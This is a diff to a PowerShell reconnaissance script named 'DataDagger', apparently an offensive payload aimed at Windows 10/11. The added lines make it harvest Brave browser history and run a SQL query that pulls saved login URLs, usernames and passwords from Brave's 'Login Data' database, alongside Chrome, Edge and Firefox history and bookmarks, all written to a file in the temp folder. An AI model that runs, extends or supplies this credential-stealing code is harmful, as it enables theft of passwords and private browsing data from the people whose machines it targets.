@@ -319,7 +319,7 @@ $output = @"
 
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
-#   Nome       : DataDagger                                                                                                                                 #
+#   Nome       : DataDagger                                                                                                                                #
 #   Autor      : Clank                                                                                                                                     #
 #   Categoria  : Recon                                                                                                                                     #
 #   Alvo       : Windows 10,11                                                                                                                             #
@@ -477,7 +477,6 @@ $drivers
 $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
-
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -492,12 +491,18 @@ function Get-BrowserData {
 
     if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite"}
-    
+    elseif ($Browser -eq 'brave'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"}
+    elseif ($Browser -eq 'brave'   -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    if ($DataType -eq 'logins') {
+        $Value = Invoke-SqliteQuery -DataSource $Path -Query "SELECT origin_url, username_value, password_value FROM logins;"
+    } else {
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    }
+
     $Value | ForEach-Object {
         $Key = $_
         if ($Key -match $Search){
@@ -520,6 +525,10 @@ Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\Br
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt
 
 ############################################################################################################################################################
 
